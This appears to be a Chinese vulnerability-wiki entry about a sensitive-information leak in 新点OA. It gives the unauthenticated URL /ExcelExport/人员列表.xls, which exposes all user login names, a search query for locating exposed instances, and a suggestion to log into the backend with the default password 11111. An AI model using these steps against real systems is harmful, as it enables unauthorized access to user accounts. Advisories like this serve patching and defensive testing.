---
title: "新点OA ExcelExport 敏感信息泄露漏洞"
date: 2026-10-17 09:12:19
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "新点OA-ExcelExport"
tags:
  - "新点OA-ExcelExport"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

新点OA 存在敏感信息泄露漏洞，访问特定的Url时可以获取所有用户的登录名信息，攻击者获取后可以进一步利用

## 漏洞影响

```
新点OA
```

## 网络测绘

```
app="新点OA"
```

## 漏洞复现

构造的Url为

```plain
/ExcelExport/人员列表.xls
```

将会下载人员列表文件

![xindian](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/xindian.png)

通过获取的登录名登陆后台(默认密码11111)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%96%B0%E7%82%B9OA-ExcelExport-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md)
